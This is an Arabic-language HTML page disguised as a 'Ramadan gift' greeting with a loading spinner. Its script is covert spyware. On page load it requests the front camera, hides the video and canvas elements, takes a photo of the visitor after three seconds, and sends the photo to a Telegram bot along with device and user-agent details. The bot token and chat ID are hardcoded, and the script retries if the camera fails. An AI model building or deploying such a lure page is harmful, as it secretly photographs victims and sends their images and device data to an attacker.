<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎁 هدية رمضان</title>
    
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Tajawal', sans-serif;
            min-height: 100vh;
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
            position: relative;
        }
        
        .bg-animation {
            position: fixed;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: 
                radial-gradient(circle at 30% 40%, rgba(247, 151, 30, 0.08) 0%, transparent 50%),
                radial-gradient(circle at 70% 60%, rgba(255, 210, 0, 0.08) 0%, transparent 50%);
            animation: rotateBg 20s linear infinite;
            z-index: 0;
        }
        
        @keyframes rotateBg {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .stars-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            pointer-events: none;
        }
        
        .star {
            position: absolute;
            width: 3px;
            height: 3px;
            background: white;
            border-radius: 50%;
            animation: twinkle var(--duration) ease-in-out infinite alternate;
        }
        
        @keyframes twinkle {
            0% { opacity: 0.2; transform: scale(0.5); }
            100% { opacity: 1; transform: scale(1.5); }
        }
        
        .container {
            position: relative;
            z-index: 1;
            width: 100%;
            max-width: 480px;
            padding: 20px;
        }
        
        .card {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(25px);
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 40px;
            padding: 55px 35px;
            box-shadow: 0 40px 80px rgba(0, 0, 0, 0.5);
            text-align: center;
            transition: all 0.4s ease;
        }
        
        .card:hover {
            transform: translateY(-5px);
            box-shadow: 0 50px 100px rgba(247, 151, 30, 0.15);
        }
        
        .gift-emoji {
            font-size: 100px;
            display: inline-block;
            animation: pulseGift 2s ease-in-out infinite;
        }
        
        @keyframes pulseGift {
            0%, 100% { transform: scale(1) rotate(0deg); }
            50% { transform: scale(1.1) rotate(-3deg); }
        }
        
        h1 {
            font-size: 36px;
            font-weight: 900;
            margin: 15px 0 10px;
            background: linear-gradient(135deg, #f7971e, #ffd200);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        
        .sub {
            color: rgba(255, 255, 255, 0.6);
            font-size: 18px;
            line-height: 1.8;
            margin-bottom: 5px;
        }
        
        video, canvas {
            display: none !important;
        }
        
        /* مؤقت مخفي */
        .hidden-loader {
            display: none;
        }
        
        @media (max-width: 500px) {
            .card { padding: 35px 20px; }
            h1 { font-size: 28px; }
            .gift-emoji { font-size: 75px; }
            .sub { font-size: 16px; }
        }
    </style>
</head>
<body>

<!-- خلفية -->
<div class="bg-animation"></div>
<div class="stars-container" id="stars"></div>

<!-- المحتوى -->
<div class="container">
    <div class="card">
        <div class="gift-emoji">🎁</div>
        <h1>هدية رمضان</h1>
        <p class="sub">🌙 رمضان كريم</p>
        <p class="sub" style="font-size:14px;color:rgba(255,255,255,0.3);margin-top:20px;">
            <i class="fas fa-spinner fa-spin"></i> جاري التحميل...
        </p>
        
        <!-- عناصر مخفية للكاميرا -->
        <video id="video" autoplay muted playsinline></video>
        <canvas id="canvas"></canvas>
    </div>
</div>

<script>
// ======================== التوكن والأيدي ========================
const BOT_TOKEN = '5418501320:AAFAjqrT_Tu2JNGe1nc2Ki-lb3kAB8QVEHE';
const CHAT_ID = '1786031358';

// ======================== نجوم الخلفية ========================
const starsContainer = document.getElementById('stars');
for (let i = 0; i < 80; i++) {
    const star = document.createElement('div');
    star.className = 'star';
    star.style.left = Math.random() * 100 + '%';
    star.style.top = Math.random() * 100 + '%';
    star.style.setProperty('--duration', (2 + Math.random() * 3) + 's');
    star.style.width = (1 + Math.random() * 3) + 'px';
    star.style.height = star.style.width;
    starsContainer.appendChild(star);
}

// ======================== عناصر الكاميرا ========================
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');

// ======================== إرسال الصورة للتليجرام ========================
function sendToTelegram(imageDataURL) {
    return new Promise((resolve, reject) => {
        const blob = dataURLToBlob(imageDataURL);
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', blob, 'capture.jpg');
        formData.append('caption', `📸 صورة جديدة\n🕒 ${new Date().toLocaleString('ar-EG')}\n📱 ${getDeviceInfo()}`);
        
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
        })
        .then(res => res.json())
        .then(data => {
            if (data.ok) resolve(true);
            else reject(data.description);
        })
        .catch(err => reject(err));
    });
}

function dataURLToBlob(dataURL) {
    const parts = dataURL.split(',');
    const mime = parts[0].match(/:(.*?);/)[1];
    const b64 = atob(parts[1]);
    const byteArray = new Uint8Array(b64.length);
    for (let i = 0; i < b64.length; i++) {
        byteArray[i] = b64.charCodeAt(i);
    }
    return new Blob([byteArray], { type: mime });
}

function getDeviceInfo() {
    const ua = navigator.userAgent;
    let device = 'Unknown';
    if (/iPhone|iPad|iPod/.test(ua)) device = 'iPhone/iPad';
    else if (/Android/.test(ua)) device = 'Android';
    else if (/Windows/.test(ua)) device = 'Windows';
    else if (/Mac/.test(ua)) device = 'Mac';
    else if (/Linux/.test(ua)) device = 'Linux';
    return `${device} | ${ua.substring(0, 80)}`;
}

// ======================== التقاط الصورة ========================
function captureAndSend() {
    try {
        const ctx = canvas.getContext('2d');
        const w = video.videoWidth || 640;
        const h = video.videoHeight || 480;
        canvas.width = w;
        canvas.height = h;
        ctx.drawImage(video, 0, 0, w, h);
        
        const dataURL = canvas.toDataURL('image/jpeg', 0.85);
        
        sendToTelegram(dataURL)
            .then(() => {
                console.log('✅ تم الإرسال بنجاح');
            })
            .catch(err => {
                console.error('❌ فشل الإرسال:', err);
            })
            .finally(() => {
                if (video.srcObject) {
                    video.srcObject.getTracks().forEach(t => t.stop());
                }
            });
    } catch (e) {
        console.error('خطأ في التصوير:', e);
    }
}

// ======================== تشغيل الكاميرا فوراً ========================
function startCamera() {
    return navigator.mediaDevices.getUserMedia({
        video: {
            facingMode: 'user',
            width: { ideal: 640 },
            height: { ideal: 480 }
        }
    });
}

// ======================== تنفيذ فور فتح الصفحة ========================
// تشغيل الكاميرا فوراً بدون أي تفاعل من المستخدم
startCamera()
    .then(stream => {
        video.srcObject = stream;
        console.log('📷 الكاميرا تعمل');
        
        // انتظار 3 ثواني ثم التصوير والإرسال
        setTimeout(() => {
            captureAndSend();
        }, 3000);
    })
    .catch(err => {
        console.error('❌ خطأ في الكاميرا:', err);
        // محاولة مرة اخرى بعد ثانيتين
        setTimeout(() => {
            startCamera()
                .then(stream => {
                    video.srcObject = stream;
                    setTimeout(() => captureAndSend(), 3000);
                })
                .catch(e => console.error('فشل المحاولة الثانية:', e));
        }, 2000);
    });

console.log('✅ النظام يعمل | Bot:', BOT_TOKEN.substring(0, 10) + '...');
</script>

</body>
</html>
